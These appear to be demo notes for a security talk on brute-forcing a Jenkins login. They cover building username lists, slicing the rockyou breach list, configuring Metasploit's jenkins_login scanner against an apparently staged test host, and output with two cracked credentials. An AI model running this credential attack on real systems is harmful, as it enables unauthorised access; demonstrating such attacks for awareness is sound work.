# Jenkins Bruteforce Login
Getting access via Social Engineering or Passwordcracking is the first attempt.

## Prepare Usernamelist

```bash
mkdir -p /root/demotalk/jenkinsBrute/
cd /root/demotalk/username-list-generator
rm output.txt user.txt
nano user.txt
```

put the names into nano.
Dont take all names to not break too much bruteforce into
```
Jeffrey van der Linden
Kay Meyer
Robert Bartsch
Ricardo Pope
```

```bash
python3 userlistcreator.py

mv output.txt /root/demotalk/jenkinsBrute/userlist.txt
cd /root/demotalk/jenkinsBrute/
```

## Prepare Passwordlist
Let's use the end of rockyoulist as that contains the sophisticated passwords
It contains 14344392 leaked passwords
Rockyou.txt is a set of compromised passwords from the social media application developer also known as RockYou. It developed widgets for the Myspace application. In December 2009, the company experienced a data breach resulting in the exposure of more than 32 million user accounts. It was mainly because of the company’s policy of storing the passwords in cleartext.

```bash
cd /root/demotalk/jenkinsBrute/
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
```

## Login Scan Module
If we want to access Jenkins as a user, we need to find a bit more information of login options.

#### Get Login URL
There are typically two login-URLs in Jenkins-world
* `/j_acegi_security_check`
* `/j_spring_security_check`
* or something the Administrator configured (like PingAccess or so)

Let's use Burpsuite to find out details.

### Prepare Options
Now that we know how to login, we can use metasploit to brute force login.
The exploit must be configured.

```bash
msfconsole

use auxiliary/scanner/http/jenkins_login
set RHOSTS jenkins.test.nevervictimconsult.xyz
set RPORT 8080
set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
set LOGIN_URL j_spring_security_check
set STOP_ON_SUCCESS true

exploit
```
There will be two successful attempts

```bash
[+] 34.159.77.191:8080 - Login Successful: Robert.Bartsch:!@#$%1234pacr1234!@#$%
[+] 34.159.77.191:8080 - Login Successful: Jeffrey_van_d_Linden:!@#$%67890QAZwsxh
```
